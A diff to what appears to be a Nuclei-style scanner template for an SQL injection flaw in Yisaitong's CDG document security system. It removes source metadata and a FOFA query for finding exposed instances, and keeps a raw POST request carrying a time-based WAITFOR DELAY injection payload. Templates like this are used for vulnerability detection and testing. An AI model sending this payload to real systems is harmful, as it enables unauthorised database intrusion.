@@ -3,12 +3,8 @@ info:
   name: 亿赛通CDG-AppExamList 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/op57xhw5vtbwqnrh'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: op57xhw5vtbwqnrh
-    fofa: app="亿赛通-电子文档安全管理系统" || app="亿赛通-DLP"
 http:
 - raw:
   - 'POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
@@ -44,9 +40,7 @@ http:
     Cookie: JSESSIONID=252E7B0BFEE67B940B1BD896B954AD4B
 
 
-    username=1''WAITFOR+DELAY''0%3a0%3a5''--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711700724-408076a7-2429-4661-9357-97f3699eb2cb.png)'
+    username=1''WAITFOR+DELAY''0%3a0%3a5''--'
   redirects: false
   matchers:
   - status:
